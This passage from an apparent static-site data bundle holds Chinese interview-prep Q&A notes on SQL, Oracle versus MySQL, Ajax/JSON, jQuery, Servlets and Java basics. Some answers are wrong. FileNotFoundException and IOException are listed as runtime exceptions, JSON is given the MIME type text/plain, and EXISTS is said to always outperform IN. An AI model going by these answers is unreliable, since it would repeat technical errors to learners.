是把电脑摔了。\n * delete 是 dml 语句，操作完以后如果没有不想提交事务还可以回滚，truncate 和 drop 是 ddl 语句，操作完马上生效，不能回滚，打个比方，delete 是发微信说分手，后悔还可以撤回，truncate 和 drop 是直接扇耳光说滚，不能反悔。\n * 执行的速度上，drop>truncate>delete，打个比方，drop 是神舟火箭，truncate 是和谐号动车，delete 是自行车。\n\n5. 左外连接，右外连接，说一下?\n\n * 左外连接：from 原表 left join 新表 on 关联关系\n   原表和新表能够关联的数据+无法通过关联关系关联到原表的数据\n\n * 右外连接：from 原表 right join 新表 on 关联关系\n   原表和新表能够关联的数据+无法通过关联关系关联到新表的数据\n\n6. sql语句中怎么判断一个字段是不是空\n\n与空判断使用is null或者is not null\n\n7. 数据源、数据库连接池、dbcp三者的关系？\n 1. 数据源：是连接数据库的一个标准\n 2. 数据库：连接池是实现数据源的一种解决方案\n 3. dbcp：是连接池的具体实现\n\n\n# 第二天\n\n1. mysql和oracle的区别\n 1. oracle使用rownum来实现分页，mysql使用limit实现分页\n\n-- - mysql查询行号\nselect \n\tw.id,\n\t@rowno := @rowno + 1 as rowno,\n\t-- 查到当前这一行的行号\n\tcase when w.id ='123456' then\n@rowno end currentrowno \n\tfrom table w order by w.rowno;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. oracle没有主键自增特性,可以使用调用序列的方式来实现主键自增；mysql可以在主键列之后添加auto_increment设置自增特性\n 3. oracle有表空间的概念，mysql没有表空间\n 4. oracle的分组函数中select之后不能直接写非分组的其他列；mysql如果没有聚组函数则可以写 其他列\n 5. oracle的表存放在用户（其实是schema对象）所属的表空间的数据文件中，   mysql的表存放在某个database中（mysql一个root用户下可以有很多database）\n 6. oracle中的一些函数和mysql也不一样 如：oracle：substr('abcd',2,2) ，mysql：substring('abcd',2,2),oracle：to_char(sysdate,'yyyy-mm-dd') ，mysql：date_format(now(),'%y-%m-%d')\n 7. oracle中的字符类型可以使用varchar2，mysql不能使用该类型\n\n2. jdbc怎样执行sql语句？\n 1. 加载驱动\n 2. 通过驱动管理对象获得连接\n 3. 获得执行器对象编写sql语句,java中用string类型表示sql\n 4. 通过执行器执行sql语句\n    常用的执行sql语句的方法有:  execute()  boolean (执行select语句时返回true,因为select能够返回一个查询结果 其他命令开头的语句返回false)； executeupdate()  int； executequery()   resultset\n 5. 释放资源\n\n3. 索引用过吗？在什么情况下会导致索引失效？用索引还需要注意哪些问题呢？索引分为几种？\n\n * 用过；如果有索引的列空值比较多、重复数据比较多的话索引不起作用。   通常索引用在查询较多而增删改较少的列，因为索引也会花时间自己维护会降低增删改的效率。\n\n * 常用的索引有普通索引、唯一性索引、位图索引，如果某个列上经常使用函数，还可以建一个函数索引。\n\n4. like 用过吗？怎么用的？\n\nlike常用来实现模糊查询，与%和_匹配使用，如果需要匹配特殊字符，则需要使用escape逃离符。\n例:搜索以“qa_”开头的数据：select code from 表 where code like 'qa/_%' escape '/'\n\n5. union 和union all的区别\n * 都是取并集，可以用来代替 or\n\n例如：有{1，2，3}和{2，3，4}\n  union 能够去除重复数据 (做排序操作)（1，2，3，4）\n  union all 不会做去重操作 效率高 （1，2，2，3，3，4）\n\n * 多个查询语句必须有相同的列数\n   多个查询语句中的列对应的数据类型必须一致\n   如：select ename,job from emp01   union   select ename,job from emp02;\n\n6. 事务的特性\n * 事务四大特性(简称acid)\n\n 1. 原子性(atomicity)： 事务中的全部操作在数据库中是不可分割的，要么全部完成，要么均不执行。\n 2. 一致性(consistency)： 事务必须是使数据库从一个一致性状态变到另一个一致性状态。一致性与原子性是密切相关的。\n 3. 隔离性(isolation)： 事务的执行不受其他事务的干扰。\n 4. 持久性(durability)： 能够将提交的数据持久化到数据库中。\n\n7. 什么是事务？特征？jdbc如何控制事务？\n\n * 多条sql语句作为 一个执行单元，要么全部执行，要么全不执行\n\n * 四大特性：原子性，一致性，隔离性，持久性\n\n * jdbc控制事务：\n   \n   * 开始事务：connection.setautocommit(false);\n   * 执行sql语句\n   * 提交:connection.commit();\n   * 回滚：connection.rollback();\n\n\n# 第三天\n\n1. 存储过程、视图、触发器\n\n * 存储过程 procedure： 在服务器端，能够被多个程序调用的一段sql语句块。\n   简单来说就是事先用数据库语言写好的一段功能，能够像函数一样被程序调用，但是存储过程本身没有返回值，是通过返回参数的形式返回数据。\n\n * 视图 view ： 视图其实就是伪表，将编译后的sql语句保存在数据库中，拿出只想让用户看见的字段，这就是视图。\n   一般来讲视图不能创建索引（因为视图本身只是一个编译后的查询语句，索引只能创建在表的列上），但是oracle提供了一种物化视图可以创建索引（物化视图：虽然叫视图但是实际类似于表，将数据暂时存储并在基表刷新或者提交数据时刷新本视图以便与基表数据保持一致）。\n\n * 触发器 trigger： 一种特殊的存储过程，不需要调用，在满足条件时触发。\n   触发条件：在对某个表做insert 、 update 或delete操作之前或之后（取决于如何实现）自动执行\n\n2. 如何调用存储过程？\n 1. jdbc中使用callablestatement执行器对象，通过execute(\"{call  过程名(?,?)}\") 的方式来调用；\n 2. pl/sql developer工具中可以通过declare begin 过程名(参数);  end;的方式调用；\n\n3. 备份数据\n 1. 第一种方式： 通过导入导出命令备份数据库中全部数据\n    oracle用exp命令导出数据，mysql使用mysqldump命令备份数据\n 2. 第二种方式： 使用工具导出数据\n\n4. in与exists的区别? 那个效率更高?\n\nexists效率更高\n\n * in :需要通过条件比较结果中的所有数据\n * exists: 只关心子查询能够查询出数据\n\n5. 悲观锁与乐观锁?\n\n * 悲观锁: 在操作表时认为另外一个对表的操作会修改数据\n   1.所以每次在拿数据的时候都会上锁，这样别人想拿这个数据就会阻塞直到它拿到锁（共享资源每次只给一个线程使用，其它线程阻塞，用完后再把资源转让给其它线程）。\n   2.java中synchronized和reentrantlock等独占锁就是悲观锁思想的实现。\n   3.传统的关系型数据库里边就用到了很多这种锁机制，比如行锁，表锁等，读锁，写锁等，都是在做操作之前先上锁。\n\n * 乐观锁: 在操作表时认为别的操作不会对表有修改数据的操作\n   1.所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有去更新这个数据，可以使用版本号机制(原子类)和cas算法实现。\n   2.乐观锁适用于多读的应用类型，这样可以提高吞吐量。\n\n6. hibernate中常见的主键增长策略？\n * assigned:在调用save方法之前设置，自定义主键增长方式\n * identity:建表语句必须支持auto_increment\n * sequence:指定序列生成主键\n * native:底层自动选择合适的策略\n * increment：最大值+1的方式\n * uuid:生成32为字符串\n\n\n# 第四天\n\n1. 结构化查询语言都是什么？\n 1. ddl alter drop truncate create\n 2. dml insert delete update\n 3. dql select\n 4. dcl grant revoke\n 5. tcl commit rollback savepoint\n\n2. drop和truncate的区别?\n * drop：删除表结构和表数据(如果删除表空间的话需要+purge)\n * truncate：删除表数据和表空间，会保留表结构\n\n3. 组函数?多行函数?\n * sum() avg() count() max() min()\n\n4. 怎么去重？\n 1. distinct 专业去重(支持多列) select distinct salary,name from student;\n 2. group by 聚合统计\n\n5. 什么时候使用多表连接？什么时候使用子查询？\n 1. 如果需要查询的数据在多个表中,一定要使用多表连接\n 2. 不需要表a中的列,但是下需要表a中的条件,可以用子查询\n 3. 子查询中如果使用了in some any all这几个关键字,效率比较低,可以转换成多表关联\n\n6. 为什么要使用视图?\n 1. 节省编译时间,提高查询效率\n 2. 屏蔽原表中的字段，避免没有权限的用户查询到其他字段\n 3. 视图的数据能够动态的来源于原表\n 4. 简单的视图可以更新视图中的数据，复杂的视图无法更新\n    create view 视图名 as select name from student;\n\n7. 为什么要给普通用户创建属于自己的表空间?\n 1. 项目中很有可能与其他项目使用同一个数据库, 多个用户在使用用一个数据库时有可能访问同一个数据库文件, 就会产生资源争用的问题。给不同的用户指定不同的表空间， 就可以让他们使用不同的数据库文件，解决资源争用的问题。\n 2. 给予用户部分权限\n\n8. 约束有哪几种?\n 1. 外键约束 foreign key references\n 2. 唯一约束 unique\n 3. 非空约束 not null\n 4. 主键约束 primary key\n 5. 检查约束 check\n\n9. 索引有哪几种?\n 1. 函数索引\n 2. 普通索引 normal\n 3. 唯一索引 unique\n 4. 位图索引 bitmap（适合在数据量比较大，基数比较小的列 如：男/女）\n\n10. 索引的优缺点?\n * 能够更快的帮助我们提高查询效率\n * 索引会降低数据库的增删改的效率，因为数据库需要花时间去维护索引,所以索引适合数据量比较大而且数据不经常改动的列\n\n11. sql语句怎么优化?\n 1. 尽量用exists代替in\n 2. 合理使用索引\n 3. 查询多个表中的数据时,尽量用多表连接\n 4. 多表连接时尽量把多的数据放在where之后\n 5. 多表连接时尽量使用表的别名,减少数据库的解析时间\n 6. 在确保语句完整的情况下,多使用commit提交语句\n 7. 优化group by，将不需要的记录在group by之前过滤掉\n\n12. 查询语句常见的关键字的优先级?\n 1. select 列名 优先级高于order by\n 2. from 表明 优先级最高\n 3. where 条件 优先级次高\n 4. group by条件 优先级次于where\n 5. having 条件 优先级一定在group by之后\n 6. order by分组 优先级最低\n\n13. oracle分页\n\nrownum，这是oracle对动态查询结果的编号，用来实现分页查询有序的整数列，每多一条自动加1\n\n 1. 不能和 group by 在同一个查询语句中\n 2. 不能用 表名.rownum\n 3. 它肯定是从1开始\n\n * 编号21-30，实现排序效果的分页\n\nselect rownum,a.*\n   \tfrom\n   \t\t(select rownum rn,b.* \n         from (select * from student order by salary) b\n         where rownum <=30) a\n   \twhere\n   \t\ta.rn >=21;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 第五天\n\n1. mysql 引擎 b+树索引（文件系统常用索引）\n\n> https://www.cnblogs.com/tiancai/p/9024351.html\n\n * 平衡二叉树：每个节点只保存一份数据\n\n * b树：每个节点可以保存多份数据，减少磁盘i/o所花的时间。\n\nb树在提高了io性能的同时并没有解决元素遍历的效率低下的问题，正是为了解决这个问题，b+树应用而生。b+树只需要去遍历叶子节点就可以实现整棵树的遍历。而且在数据库中基于范围的查询是非常频繁的，而b树不支持这样的操作或者说效率太低。\n\n * b+树：只有最底层的叶子节点（文件）保存数据，非叶子节点只保存索引。\n\n由于b+树的数据都存储在叶子结点中，分支结点均为索引，方便扫库，只需要扫一遍叶子结点即可，但是b树因为其分支结点同样存储着数据，我们要找到具体的数据，需要进行一次中序遍历按序来扫，所以b+树更加适合在区间查询的情况，所以通常b+树用于数据库索引。\n\n非叶子节点的子树指针与关键字个数相同。b+树的查询效率更加稳定：由于非终结点并不是最终指向文件内容的结点，而只是叶子结点中关键字的索引。所以任何关键字的查找必须走一条从根结点到叶子结点的路。所有关键字查询的路径长度相同，导致每一个数据的查询效率相当。",charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-前端基础篇",frontmatter:{title:"Q&A宝典-前端基础篇",date:"2019-03-26T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_fe_001.html",relativePath:"views/qaq/sum_fe_001.md",key:"v-ad9e2cd0",path:"/views/qaq/sum_fe_001.html",headers:[{level:2,title:"Ajax",slug:"ajax",normalizedTitle:"ajax",charIndex:2},{level:2,title:"Json",slug:"json",normalizedTitle:"json",charIndex:88},{level:2,title:"jQuery",slug:"jquery",normalizedTitle:"jquery",charIndex:888},{level:2,title:"Jsp el表达式",slug:"jsp-el表达式",normalizedTitle:"jsp el表达式",charIndex:1499}],headersStr:"Ajax Json jQuery Jsp el表达式",content:'# Ajax\n\n1. Ajax支持几种数据传递的方式?\n 1. 字符串 text/plain\n 2. xml text/xml\n 3. json text/plain\n\n\n# Json\n\n1. json的格式?\n\n 1. 键值对 {key1:value1,key2:value2..}\n\n 2. 数组 [value1,value2..]\n\n> 其中key必须是String类型,value支持null,Object,json等\n\n2. json有哪几种封装方式?\n\n 1. 可以封装任意类型的数据\n    \n    JSONObject jo1 = new JSONObject(); jo1.put("key",value);\n\n 2. 用来封装自定义数据类型和Map\n    \n    Map<Integer,String> map = new HashMap<>();\n    map.put(1,"王者"); map.put(2,"荣耀");\n    JSONObject jo2 = JSONObject.fromObject(map);\n\n 3. 专门用来封装集合和数组\n    \n    List<String> list = new ArrayList<>();\n    list.add("飞龙");list.add("在天");\n    JSONArray jo3 = JSONArray.fromObject(list);\n\n3. json如何对自定义数据类型进行有选择性的封装?(hibernate中`防止`多表级联发生的`死循环`)\n\n * 引入JsonConfig\n   \n   JsonConfig jc = new JsonConfig(new String[]{"不想要的属性1","不想要的属性2"..});\n   JSONObject jo = JSONObject.fromObject(对象,jc);\n\n4. json的包名是?\n\nnet.sf.json.JSONArray;\nnet.sf.json.JSONObject;\n\n\n# jQuery\n\n1. jQuery基本选择器\n * #id、.class\n * 查找所有未选中的input元素：$("input:not(:checked)");\n * 选中所有name属性是newsletter的input元素：$("input[name=\'newsletter\']").attr("checked",true);\n\n2. attr和prop的区别\n\nattr：可以获取元素自定义属性和本身自带的属性\nprop：用来获取元素本身属性\n\n3. disabled和readonly的区别\n\ndisabled：样式 灰色，后台请求接收不到参数 始终为null\nreadonly：样式 白色，后台请求参数可以接收\n\n3. 简述Css层叠特性与继承特性\n\n * 层叠特性: 当多种基本选择器出现冲突时优先级问题，id选择器>类别选择器>标记选择器\n\n * 继承特性: 当子元素与父元素没有任何冲突时，子元素会完全继承父元素的所有css渲染样式\n\n4. 写出至少三种Js选择器的使用方式\n\ndocument.getElementById("idName");\ndocument.getElementsByTagName("tagName");\ndocument.getElementsByClassName("className");\ndocument.getElementsByName("name");\n\n\n# Jsp el表达式\n\n1. 请使用Js脚本在页面显示九九乘法表\n\nlet str = "";\nfor(let a = 1;a<=9;a++){\n    for(let b = 1;b<=a;b++){\n        str += b+"*"+a+"="+b*a+"\\t";\n    }\n    str += "<br />";\n}\t\t\t\t\t\ndocument.write(str);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n2. el表达式取值\n\n 1. 通过属性取值：${param.键}\n    拿取全局参数：${initParam.键}\n\n 2. 四范围取值：\n    ${pageScope.elena} 当前页有效\n    ${requestScope.elena} 跳转页面有效\n    ${sessionScope.elena} session范围有效\n    ${application.elena} 时间到期前一直有效\n\n> 我们一般只写键,但是当有多个范围的键冲突时,默认拿取范围最小的键值\n\n3. el表达式的缺陷\n 1. EL表达式无法直接取值，必须通过key和提供的四范围取值，如果取值失败,什么都不显示\n 2. 解决：空验证，如果取不到值返回true，如果可以取值返回false\n    如：${empty sessionScope.key}',normalizedContent:'# ajax\n\n1. ajax支持几种数据传递的方式?\n 1. 字符串 text/plain\n 2. xml text/xml\n 3. json text/plain\n\n\n# json\n\n1. json的格式?\n\n 1. 键值对 {key1:value1,key2:value2..}\n\n 2. 数组 [value1,value2..]\n\n> 其中key必须是string类型,value支持null,object,json等\n\n2. json有哪几种封装方式?\n\n 1. 可以封装任意类型的数据\n    \n    jsonobject jo1 = new jsonobject(); jo1.put("key",value);\n\n 2. 用来封装自定义数据类型和map\n    \n    map<integer,string> map = new hashmap<>();\n    map.put(1,"王者"); map.put(2,"荣耀");\n    jsonobject jo2 = jsonobject.fromobject(map);\n\n 3. 专门用来封装集合和数组\n    \n    list<string> list = new arraylist<>();\n    list.add("飞龙");list.add("在天");\n    jsonarray jo3 = jsonarray.fromobject(list);\n\n3. json如何对自定义数据类型进行有选择性的封装?(hibernate中`防止`多表级联发生的`死循环`)\n\n * 引入jsonconfig\n   \n   jsonconfig jc = new jsonconfig(new string[]{"不想要的属性1","不想要的属性2"..});\n   jsonobject jo = jsonobject.fromobject(对象,jc);\n\n4. json的包名是?\n\nnet.sf.json.jsonarray;\nnet.sf.json.jsonobject;\n\n\n# jquery\n\n1. jquery基本选择器\n * #id、.class\n * 查找所有未选中的input元素：$("input:not(:checked)");\n * 选中所有name属性是newsletter的input元素：$("input[name=\'newsletter\']").attr("checked",true);\n\n2. attr和prop的区别\n\nattr：可以获取元素自定义属性和本身自带的属性\nprop：用来获取元素本身属性\n\n3. disabled和readonly的区别\n\ndisabled：样式 灰色，后台请求接收不到参数 始终为null\nreadonly：样式 白色，后台请求参数可以接收\n\n3. 简述css层叠特性与继承特性\n\n * 层叠特性: 当多种基本选择器出现冲突时优先级问题，id选择器>类别选择器>标记选择器\n\n * 继承特性: 当子元素与父元素没有任何冲突时，子元素会完全继承父元素的所有css渲染样式\n\n4. 写出至少三种js选择器的使用方式\n\ndocument.getelementbyid("idname");\ndocument.getelementsbytagname("tagname");\ndocument.getelementsbyclassname("classname");\ndocument.getelementsbyname("name");\n\n\n# jsp el表达式\n\n1. 请使用js脚本在页面显示九九乘法表\n\nlet str = "";\nfor(let a = 1;a<=9;a++){\n    for(let b = 1;b<=a;b++){\n        str += b+"*"+a+"="+b*a+"\\t";\n    }\n    str += "<br />";\n}\t\t\t\t\t\ndocument.write(str);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n2. el表达式取值\n\n 1. 通过属性取值：${param.键}\n    拿取全局参数：${initparam.键}\n\n 2. 四范围取值：\n    ${pagescope.elena} 当前页有效\n    ${requestscope.elena} 跳转页面有效\n    ${sessionscope.elena} session范围有效\n    ${application.elena} 时间到期前一直有效\n\n> 我们一般只写键,但是当有多个范围的键冲突时,默认拿取范围最小的键值\n\n3. el表达式的缺陷\n 1. el表达式无法直接取值，必须通过key和提供的四范围取值，如果取值失败,什么都不显示\n 2. 解决：空验证，如果取不到值返回true，如果可以取值返回false\n    如：${empty sessionscope.key}',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-前端进阶篇",frontmatter:{title:"Q&A宝典-前端进阶篇",date:"2019-05-24T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_fe_002.html",relativePath:"views/qaq/sum_fe_002.md",key:"v-a8db2454",path:"/views/qaq/sum_fe_002.html",headers:[{level:2,title:"Servlet(单实例多线程)",slug:"servlet-单实例多线程",normalizedTitle:"servlet(单实例多线程)",charIndex:2},{level:2,title:"偏后端",slug:"偏后端",normalizedTitle:"偏后端",charIndex:1185}],headersStr:"Servlet(单实例多线程) 偏后端",content:'# Servlet(单实例多线程)\n\n1.Servlet的生命周期\n 1. 构造方法\n 2. 初始化方法init()\n 3. service方法(由容器帮我们调用,不建议重写)\n 4. doGet/doPost方法(需要我们来进行逻辑处理)\n 5. 销毁方法destory()\n\n2. Servlet的四个范围及其局限性\n\n> 因为可以通过这四个对象setAttribute()传值。\n\n 1. pageContext：第一范围,页面跳转立即失效\n 2. HttpServletRequest：第二范围,重定向失效\n 3. HttpSession：第三范围,默认有效期到或者浏览器关闭失效\n 4. ServletContext：第四范围,只要tomcat开着一直有效\n\n3. 两种跳转方式\n\n 1. 请求转发\n    跳转之后浏览器地址栏不发生改变；\n    跳转之前执行的是doGet/doPost，跳转之后还是执行的这个方法\n\n 2. 重定向\n    跳转之后浏览器地址栏发生改变；\n    跳转之后肯定执行doGet方法；\n    request第二范围失效(因为浏览器发送的不是同一个请求了)\n\n4. session保存信息及删除\n * 保存信息：\n   session.setAttribute("n",name);\n   String name = (String)sessin.getAttribute("n");\n * 删除信息：\n   session.removeAttribute("n");\n   session.invalidate()是把session内的所有属性都清除;\n\n5. Cookie HttpSession两种会话机制比较\n * Cookie:\n   浏览器提供的会话信息,安全性较低；\n   Cookie cookie = new Cookie(String,String)；\n   cookie仅支持字符串，默认不支持中文，是将信息保存到客户端本地\n * session:\n   服务器提供的会话信息，安全性较高；\n   session的信息当默认时间到期(期间没有任何操作!!)或者关闭浏览器或者调用invalidate() 之后失效\n\n> 不过现在一般都用基于客户端的JWT，轻便安全高效\n\n6. Cookie和Session之间有什么联系,如果有,请说出他们的联系\n 1. session默认依靠cookie维持，如果cookie被禁用，那么session会话机制失效\n 2. session是由servlet容器创建的\n    当用户getSession()时，web容器会先去cookie查找有没有这个session的id，如果没有，那么cookie就会分配一个就jsessionid并且保存在cookie中\n\n\n# 偏后端\n\n1. Servlet核心的API？\n\nJavax.servlet.Servlet\n\nJavax.servlet.ServletConfig\n\nJavax.servlet.http.HttpServlet\n\nHttpServletRequest，HttpServletResponse\n\n2. Servlet/jsp中的对象的创建、实现和调用？\n\n                创建者   实现者   调用者\nServlet         容器    我们    容器\nServletConfig   容器    容器    我们\nCookie          我们    容器    我们\nSession         容器    容器    我们',normalizedContent:'# servlet(单实例多线程)\n\n1.servlet的生命周期\n 1. 构造方法\n 2. 初始化方法init()\n 3. service方法(由容器帮我们调用,不建议重写)\n 4. doget/dopost方法(需要我们来进行逻辑处理)\n 5. 销毁方法destory()\n\n2. servlet的四个范围及其局限性\n\n> 因为可以通过这四个对象setattribute()传值。\n\n 1. pagecontext：第一范围,页面跳转立即失效\n 2. httpservletrequest：第二范围,重定向失效\n 3. httpsession：第三范围,默认有效期到或者浏览器关闭失效\n 4. servletcontext：第四范围,只要tomcat开着一直有效\n\n3. 两种跳转方式\n\n 1. 请求转发\n    跳转之后浏览器地址栏不发生改变；\n    跳转之前执行的是doget/dopost，跳转之后还是执行的这个方法\n\n 2. 重定向\n    跳转之后浏览器地址栏发生改变；\n    跳转之后肯定执行doget方法；\n    request第二范围失效(因为浏览器发送的不是同一个请求了)\n\n4. session保存信息及删除\n * 保存信息：\n   session.setattribute("n",name);\n   string name = (string)sessin.getattribute("n");\n * 删除信息：\n   session.removeattribute("n");\n   session.invalidate()是把session内的所有属性都清除;\n\n5. cookie httpsession两种会话机制比较\n * cookie:\n   浏览器提供的会话信息,安全性较低；\n   cookie cookie = new cookie(string,string)；\n   cookie仅支持字符串，默认不支持中文，是将信息保存到客户端本地\n * session:\n   服务器提供的会话信息，安全性较高；\n   session的信息当默认时间到期(期间没有任何操作!!)或者关闭浏览器或者调用invalidate() 之后失效\n\n> 不过现在一般都用基于客户端的jwt，轻便安全高效\n\n6. cookie和session之间有什么联系,如果有,请说出他们的联系\n 1. session默认依靠cookie维持，如果cookie被禁用，那么session会话机制失效\n 2. session是由servlet容器创建的\n    当用户getsession()时，web容器会先去cookie查找有没有这个session的id，如果没有，那么cookie就会分配一个就jsessionid并且保存在cookie中\n\n\n# 偏后端\n\n1. servlet核心的api？\n\njavax.servlet.servlet\n\njavax.servlet.servletconfig\n\njavax.servlet.http.httpservlet\n\nhttpservletrequest，httpservletresponse\n\n2. servlet/jsp中的对象的创建、实现和调用？\n\n                创建者   实现者   调用者\nservlet         容器    我们    容器\nservletconfig   容器    容器    我们\ncookie          我们    容器    我们\nsession         容器    容器    我们',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Q&A宝典-Java基础篇",frontmatter:{title:"Q&A宝典-Java基础篇",date:"2019-02-17T00:00:00.000Z",tags:["复习"],categories:["知识晶体 Q&A"],isShowComments:!1},regularPath:"/views/qaq/sum_java_001.html",relativePath:"views/qaq/sum_java_001.md",key:"v-77ec63d2",path:"/views/qaq/sum_java_001.html",headers:[{level:2,title:"第一天",slug:"第一天",normalizedTitle:"第一天",charIndex:2},{level:2,title:"第二天",slug:"第二天",normalizedTitle:"第二天",charIndex:1194},{level:2,title:"第三天",slug:"第三天",normalizedTitle:"第三天",charIndex:3230},{level:2,title:"第四天",slug:"第四天",normalizedTitle:"第四天",charIndex:4597},{level:2,title:"第五天",slug:"第五天",normalizedTitle:"第五天",charIndex:5918}],headersStr:"第一天 第二天 第三天 第四天 第五天",content:'# 第一天\n\n1. 常用的集合有哪些？\n\nMap接口和Collection接口是所有集合框架的父接口：\n\n * Collection接口的子接口包括：Set接口和List接口；\n * Map接口的实现类主要有：HashMap、ConcurrentHashMap、TreeMap、Hashtable以及Properties等；\n * Set接口的实现类主要有：HashSet、LinkedHashSet、TreeSet等；\n * List接口的实现类主要有：ArrayList、LinkedList、Stack、Vector等。\n\n2. 静态变量和成员变量的区别？\n * 所属不同： 静态变量属于类，所以也成为类变量；成员变量属于对象，所有也成为实例变量（对象变量）；\n * 在内存中出现的时间不同： 静态变量只在类创建时加载一次，随着类的加载而加载随着类的消失而消失；成员变量随着对象（也叫实例）的创建而存在，随着对象的消失而消失；\n * 在内存中的位置不同： 静态变量存储于方法区里的静态区，成员变量属于对内存；\n * 调用方式不同： 静态变量可以通过类名调用，也可以通过对象调用；成员变量只能通过对象调用；\n\n3. filter过滤器用过吗？一般用在什么地方？\n * 用过\n * 例如实现Servlet，Jsp或静态html等文件的拦截，从而实现一些特殊功能。\n * 例如实现URL级别的权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。\n\n4. 多线程一般用在什么地方？\n * 多线程的作用：充分利用CPU资源，提高CPU使用率，才用多线程的方式去同时完成几件事情而不相互干扰\n * 用在什么地方：大多情况下，用到多线程主要是需要处理大量的IO操作或处理需要耗费大量时间的操作等等。比如：读写文件等。\n\n5. int和Integer的区别？\n * Integer是int的包装类，而int是Java的一种基本数据类型\n * Integer是类，必须实例化之后才能使用，而int变量不需要\n * Integer的默认值是null，而int的默认值是0\n * Integer实际是对象的引用，当new一个Integer时，实际上是生成一个指针只想此对象；而int是直接存储数据值\n\n6. 3.2E3F 里面的E/F分别表示什么？\n * E：科学计数法 3.2*10（3）\n * F:表示float类型\n\n7. switch（参数） case的参数可以传哪些数据类型？\n * jdk1.0 char byte short int\n   jdk5.0 enum(枚举)\n   jdk7.0 String\n\n8. do while 和while之间的区别？\n * do while 先执行 然后在判断 保证程序至少执行一次【先斩后奏】\n * while 先判断 符合条件在执行\n\n\n# 第二天\n\n1. list用过哪些？ArrayList如何排序？list和Set的区别？\n * 用过ArrayList、LinkedList、Vector\n   \n * 排序：sort()\n\n> List和Set的区别：\n> \n>  1. List，Set都是继承自Collection接口\n>  2. List特点：元素放入有顺序，元素可以重复。\n>     Set特点：元素放入无顺序，元素不可重复，重复元素会覆盖。\n>  3. Set和List对比：\n>     Set：检索元素效率低下，删除和插入效率高，删除和插入不会引起元素位置的改变。\n>     List：和数组类似，List可以动态增长，查找元素效率高，增删元素效率低，因为增删元素会引起其他元素位置的改变。\n\n2. 异常包括什么？说一下什么是运行时异常、非运行时异常，举例说明。\n\n * 异常是指程序运行过程当中出现的例外情况\n   \n   异常的体系结构：\n   \n   graph TB\n   \tThrowable --\x3e Error\n   \tThrowable --\x3e Exception\n   \tException --\x3e RuntimeException\n   \n   \n   1\n   2\n   3\n   4\n   \n\n异常包括：运行时异常和非运行时异常\n\n * 运行时异常(RuntimeException)：指编译能通过，直到运行的时候才体现出来\n * 非运行时异常(Exception)：指在编译的时候必须明确该如何处理，否则根本无法通过编译\n * Error：描述了Java运行时系统的内部错误或资源耗尽错误。大多数错误与代码编写无关，而表示代码运行时JVM出现的问题。应用程序不应该抛出这种类型的对象。\n\n常见的运行时异常(RuntimeException)有：\n\n 1. IndexOutOfBoundsException（下标越界异常）\n 2. NullPointerException（空指针异常）\n 3. NumberFormatException（String转换为指定的数字异常）\n 4. ArithmeticException（算术异常，如除数为0）\n 5. FileNotFoundException（文件未找到异常）\n 6. IOException（操作输入流和输出流时可能出现的异常，如磁盘损坏等）\n\n3. 线程的实现方式\n\n 1. 继承Thread类，重写run方法 (其实Thread类本身也实现了Runnable接口)\n\n 2. 实现Runnable接口， 重写run方法。（传入Thread类的构造方法中，由Thread的start启用线程）\n\n 3. 实现Callable接口，重写call方法(有抛出异常和有返回值)\n    \n    通过Callable和FutureTask创建线程，将Callable实现类传入FutureTask构造方法中，由FutureTask的start方法启用线程\n\n 4. 通过线程池创建线程\n\n4. 怎么处理异常\n * 抛还上级：throws\n * 自行处理：try catch finally\n\n5. 多态的实现机制\n\nJava中实现多态的机制靠的是： 父类或接口定义的引用变量可以指向子类或具体的实现类的实例对象，而程序调的方法在运行期才动态绑定，就是引用变量所指向的具体实例对象的方法，也就是内存里正在运行的那个对象的方法，而不是引用变量的类型中定义的方法。\n\n> 一句话：父类或接口引用指向具体的实例对象\n\n多态的不同表现形式：方法的重写和重载就是Java多态的不同表现\n\n * 重写Overriding是父类与子类之间多态的一种表现\n * 重载OverLoding是一个类中多态的一种表现\n\n6. Java简单运算面试题\n\nshort x = 1;\nx = x + 1;//左边short = 右边int？\nSystem.out.println(x);//报错\n\nshort y = 1;\ny += 1;//y = (short)(y + 1); +=会自动转换\nSystem.out.println(y);//2\n\n\n1\n2\n3\n4\n5\n6\n7\n\n7. StringBuffer和StringBuilder之间的区别？\n * StringBuffer和StringBuilder在创建对象的时候 都会多预留16块缓冲区\n\n 1. StringBuffer 同一时间允许一个线程进行访问，效率较低，但是不会出现并发错误\n 2. StringBuilder 同一时间允许多个线程进行访问，效率较高，但是可能会出现并发错误\n\n8. 为什么不把一个类所有的方法全部定义成静态的呢？\n * 静态方法里面只能直接的访问静态成员\n * 如果想要在静态方法里面访问非静态成员的话，需要先创建对象，拿着对象去调用\n\n\n# 第三天\n\n1. &和&&的区别\n\n&和&&都可以作为逻辑运算符使用\n\n&&有短路特性，当通过前面条件能够得知最终表达式结论的话，后面的条件会短路掉不做判断，所以效率更高。&没有短路特性，两边的条件都会进行判断。\n\n另外&还是按位运算符的按位与运算。当&左右两边连接的是整数类型的时候作为二进制按位与运算，也就是将两个数的二进制位都是1的结果写1。\n\n2. final，finally，finalize的区别\n\n * final是一个修饰符，可以用于修饰类、方法、变量\n   \n   修饰类代表最终类，表示不能被继承\n   修饰方法代表最终方法，表示此方法不能被覆盖（但是可以被继承）\n   修饰表示引用地址或值不能被修改\n\n * finally是异常处理的语法结构，表示无论是否出现异常最终都要执行的操作。\n   \n   通常是释放和关闭资源的操作（如数据库连接和文件io流的关闭）\n\n * finalize是Object类中的一个方法，表示在gc回收对象之前会调用这个方法\n\n3. String和StringBuffer的区别\n\nString和StringBuffer都是Java当中提供的字符串类型，其中String没有预留缓冲空间，而StringBuffer会在原先内容的基础上预留一部分的缓冲空间。\n\n> String： "a" + "b" 